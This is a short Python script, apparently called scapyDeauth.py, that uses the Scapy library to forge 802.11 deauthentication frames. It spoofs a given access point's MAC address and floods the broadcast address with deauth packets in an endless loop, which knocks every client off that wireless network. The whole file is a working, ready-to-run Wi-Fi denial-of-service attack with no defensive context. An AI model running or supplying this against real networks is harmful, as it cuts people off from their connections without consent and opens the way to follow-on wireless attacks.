import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

if len(sys.argv) != 3:
    print("Program requires 2 arguments ('access point MAC' & 'interface')")
    print("Example usage: 'python3 scapyDeauth.py 01:23:45:67:89:AB wlan0mon'\n")
else:
    apMAC = sys.argv[1]
    interface = sys.argv[2]
    targetMAC = "ff:ff:ff:ff:ff:ff"
    dot11 = Dot11(addr1=targetMAC, addr2=apMAC, addr3=apMAC)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    while True:
        sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)

